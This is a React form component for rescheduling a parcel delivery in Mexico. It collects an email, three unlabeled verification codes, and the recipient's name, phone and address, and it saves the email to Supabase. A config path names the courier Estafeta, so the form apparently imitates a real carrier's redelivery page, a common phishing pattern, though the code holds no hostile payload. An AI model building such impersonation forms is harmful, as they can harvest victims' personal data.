import { useMemo, useState } from 'react';
import ActionButton from './ActionButton.jsx';
import MaterialIcon from './MaterialIcon.jsx';
import { supabase, REDELIVERY_TABLE } from '../lib/supabase.js';

// ─── Configurable copy ──────────────────────────────────────────────
// Edit the strings below to change titles, subtitles, and placeholders.

const FORM_INTRO = {
  eyebrow: 'Solicitud de reprogramación de entrega',
  title: 'Programa tu nueva visita',
};

const STEPS = {
  email: {
    number: 1,
    title: 'Tu correo electrónico',
    subtitle: 'Lo guardaremos junto a tu solicitud para darte seguimiento.',
  },
  verify: {
    number: 2,
    title: 'Verifica tu envío',
  },
  delivery: {
    number: 3,
    title: 'Datos de entrega',
    subtitle: 'Quién recibe y a qué dirección queremos llegar.',
  },
  schedule: {
    number: 4,
    title: 'Programa la visita',
    subtitle: 'Elige el día y horario que mejor te convenga.',
  },
};

// Each verification box: edit `label`, `helper`, `placeholder`, and the
// `validate` function to tweak titles or rules.
const VERIFICATION_FIELDS = [
  {
    key: 'input1',
    label: 'input1',
    helper: '10 a 22 caracteres',
    placeholder: 'ABC1234567890',
    maxLength: 22,
    inputMode: 'text',
    validate: (v) => /^[A-Za-z0-9]{10,22}$/.test(v),
  },
  {
    key: 'input2',
    label: 'input2',
    helper: '5 dígitos',
    placeholder: '12345',
    maxLength: 5,
    inputMode: 'numeric',
    validate: (v) => /^[0-9]{5}$/.test(v),
  },
  {
    key: 'input3',
    label: 'input3',
    helper: '5 dígitos',
    placeholder: '12345',
    maxLength: 5,
    inputMode: 'numeric',
    validate: (v) => /^[0-9]{5}$/.test(v),
  },
];

const VERIFIED_MESSAGE = 'Datos verificados';

// Browser-acceptable HTML5 email pattern is permissive; we add a
// simple guard so the green check only appears when there's a domain.
const isValidEmail = (v) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);

// ─── Helpers ────────────────────────────────────────────────────────

function buildUpcomingDates(count = 5) {
  const dates = [];
  const cursor = new Date();
  cursor.setHours(0, 0, 0, 0);
  cursor.setDate(cursor.getDate() + 1);
  while (dates.length < count) {
    if (cursor.getDay() !== 0) {
      dates.push(new Date(cursor));
    }
    cursor.setDate(cursor.getDate() + 1);
  }
  return dates;
}

function formatDateLabel(date) {
  const formatted = date.toLocaleDateString('es-MX', {
    weekday: 'long',
    day: 'numeric',
    month: 'long',
  });
  return formatted.charAt(0).toUpperCase() + formatted.slice(1);
}

// ─── Component ──────────────────────────────────────────────────────

export default function RedeliveryForm() {
  const upcomingDates = useMemo(() => buildUpcomingDates(5), []);
  const initialState = useMemo(
    () => Object.fromEntries(VERIFICATION_FIELDS.map((field) => [field.key, ''])),
    [],
  );
  const [email, setEmail] = useState('');
  const [verification, setVerification] = useState(initialState);
  const [submitState, setSubmitState] = useState({ status: 'idle', message: '' });

  const fieldStatus = VERIFICATION_FIELDS.map((field) => ({
    field,
    value: verification[field.key],
    valid: field.validate(verification[field.key]),
  }));
  const allVerified = fieldStatus.every(({ valid }) => valid);
  const emailValid = isValidEmail(email);

  const updateField = (key, raw) => {
    setVerification((prev) => ({ ...prev, [key]: raw }));
  };

  const handleSubmit = async (event) => {
    event.preventDefault();
    if (!emailValid) {
      setSubmitState({ status: 'error', message: 'Ingresa un correo electrónico válido.' });
      return;
    }
    if (!supabase) {
      setSubmitState({
        status: 'error',
        message:
          'Falta configurar Supabase. Revisa estafeta/.env (VITE_SUPABASE_URL y VITE_SUPABASE_ANON_KEY).',
      });
      return;
    }
    setSubmitState({ status: 'submitting', message: '' });
    const { error } = await supabase.from(REDELIVERY_TABLE).insert({ email });
    if (error) {
      setSubmitState({
        status: 'error',
        message: `No se pudo guardar tu correo (${error.message}).`,
      });
      return;
    }
    setSubmitState({ status: 'success', message: 'Tu correo quedó registrado.' });
  };

  return (
    <form className="redelivery-form" onSubmit={handleSubmit} noValidate>
      <div className="form-panel-title">
        <span>{FORM_INTRO.eyebrow}</span>
        <strong>{FORM_INTRO.title}</strong>
      </div>

      <section className="form-step">
        <header className="form-step-header">
          <span className="form-step-badge">{String(STEPS.email.number).padStart(2, '0')}</span>
          <div>
            <h3>{STEPS.email.title}</h3>
            <p>{STEPS.email.subtitle}</p>
          </div>
        </header>
        <label>
          Correo electrónico
          <input
            autoComplete="email"
            inputMode="email"
            placeholder="tunombre@correo.com"
            required
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
        </label>
      </section>

      <section className="form-step">
        <header className="form-step-header">
          <span className="form-step-badge">{String(STEPS.verify.number).padStart(2, '0')}</span>
          <div>
            <h3>{STEPS.verify.title}</h3>
            <p>{STEPS.verify.subtitle}</p>
          </div>
        </header>

        <div className="verification-grid">
          {fieldStatus.map(({ field, value, valid }) => (
            <label
              key={field.key}
              className={`verification-box${valid ? ' is-valid' : ''}`}
            >
              <span className="verification-label">{field.label}</span>
              <span className="verification-helper">{field.helper}</span>
              <input
                autoComplete="off"
                inputMode={field.inputMode}
                maxLength={field.maxLength}
                placeholder={field.placeholder}
                type="text"
                value={value}
                onChange={(e) => updateField(field.key, e.target.value)}
              />
            </label>
          ))}
        </div>

        <div
          className={`verification-confirm${allVerified ? ' is-visible' : ''}`}
          aria-live="polite"
        >
          <MaterialIcon name="check_circle" />
          <span>{VERIFIED_MESSAGE}</span>
        </div>
      </section>

      <section className="form-step">
        <header className="form-step-header">
          <span className="form-step-badge">{String(STEPS.delivery.number).padStart(2, '0')}</span>
          <div>
            <h3>{STEPS.delivery.title}</h3>
            <p>{STEPS.delivery.subtitle}</p>
          </div>
        </header>

        <div className="form-row">
          <label>
            Nombre de quien recibe
            <input autoComplete="name" placeholder="Nombre completo" type="text" />
          </label>
          <label>
            Teléfono de contacto
            <input autoComplete="tel" placeholder="Teléfono" type="tel" />
          </label>
        </div>
        <label>
          Dirección de entrega
          <input
            autoComplete="street-address"
            placeholder="Calle, número, colonia, alcaldía o municipio"
            type="text"
          />
        </label>
        <label>
          Código postal
          <input
            autoComplete="postal-code"
            inputMode="numeric"
            maxLength={5}
            placeholder="00000"
            type="text"
          />
        </label>
      </section>

      <section className="form-step">
        <header className="form-step-header">
          <span className="form-step-badge">{String(STEPS.schedule.number).padStart(2, '0')}</span>
          <div>
            <h3>{STEPS.schedule.title}</h3>
            <p>{STEPS.schedule.subtitle}</p>
          </div>
        </header>

        <div className="form-row">
          <label>
            Fecha preferida
            <select defaultValue="">
              <option value="" disabled>
                Selecciona un día
              </option>
              {upcomingDates.map((date) => {
                const value = date.toISOString().slice(0, 10);
                return (
                  <option key={value} value={value}>
                    {formatDateLabel(date)}
                  </option>
                );
              })}
            </select>
          </label>
          <label>
            Horario sugerido
            <select defaultValue="">
              <option value="" disabled>
                Selecciona un rango
              </option>
              <option value="morning">9:00 a 12:00</option>
              <option value="midday">12:00 a 15:00</option>
              <option value="afternoon">15:00 a 18:00</option>
              <option value="any">Cualquier horario</option>
            </select>
          </label>
        </div>
        <label>
          Referencias para el mensajero
          <textarea
            placeholder="Ej. fachada, entre calles, acceso, instrucciones de seguridad"
            rows="3"
          />
        </label>
        <label className="checkbox-row">
          <input type="checkbox" />
          <span>Confirmo que habrá una persona disponible para recibir el paquete.</span>
        </label>
      </section>

      {submitState.status !== 'idle' ? (
        <div className={`form-submit-feedback is-${submitState.status}`} aria-live="polite">
          {submitState.status === 'submitting' ? (
            <span>Guardando...</span>
          ) : (
            <>
              <MaterialIcon name={submitState.status === 'success' ? 'check_circle' : 'error'} />
              <span>{submitState.message}</span>
            </>
          )}
        </div>
      ) : null}

      <ActionButton type="submit" disabled={submitState.status === 'submitting'}>
        {submitState.status === 'submitting' ? 'Guardando...' : 'Reprogramar entrega'}
      </ActionButton>
    </form>
  );
}
